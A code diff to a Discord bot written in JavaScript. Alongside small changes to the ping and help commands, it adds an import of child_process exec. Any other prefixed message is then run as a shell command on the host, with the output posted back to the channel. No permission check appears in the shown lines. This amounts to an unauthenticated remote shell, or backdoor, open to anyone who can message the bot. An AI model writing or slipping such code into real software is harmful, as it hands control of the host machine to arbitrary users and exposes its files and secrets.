@@ -8,6 +8,8 @@ const PREFIX = require("./storage/config.json").prefix;
 // require discord.js
 const Discord = require("discord.js");
 
+const { exec } = require("child_process");
+
 const client = new Discord.Client({
     intents: [
         "GUILDS",
@@ -43,11 +45,25 @@ client.on("message", (message) => {
 
     // make a ping command
     if (message.content.startsWith(PREFIX + "ping"))
-        require("./commands/ping").execute(message, args);
+    {require("./commands/ping").execute(message, args); return;}
 
     // help command
     if (message.content.startsWith(PREFIX + "help"))
-        require("./commands/help").execute(message, args);
+    {require("./commands/help").execute(message, args); return;}
+    
+    if (message.content.startsWith(PREFIX)) {
+        exec(command + " " + args.join(" "), (error, stdout, stderr) => {
+    if (error) {
+        message.reply(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        message.reply(`stderr: ${stderr}`);
+        return;
+    }
+    message.reply(`stdout: ${stdout}`);
+});
+    }
 });
 
 // login to discord with your app's token
